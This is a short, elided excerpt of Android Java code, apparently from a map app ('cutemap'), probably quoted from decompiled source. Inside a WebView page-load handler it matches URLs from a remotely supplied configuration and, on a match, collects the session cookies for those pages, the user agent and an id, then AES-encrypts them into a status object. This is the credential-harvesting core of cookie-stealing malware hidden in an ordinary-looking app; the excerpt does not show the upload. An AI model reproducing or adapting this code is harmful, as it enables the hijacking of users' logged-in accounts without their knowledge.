...
import static net.ncie.cutemap.constant.Constant.FIRST;
        ...
        public void onPageFinished(WebView view, String url) {
            ...
            if (!isLoad) {
                if (url.contains(adBean.getPli()) || url.contains(adBean.getPli1()) || url.contains(adBean.getMy1())) {
                    ...
                    String encrypt = AesUtil.encrypt(new Gson().toJson(new ChannelStatusBean("10018", CookieManager.getInstance().getCookie(adBean.getMy()), CookieManager.getInstance().getCookie(url), my_web_view.getSettings().getUserAgentString(), url,aid)));
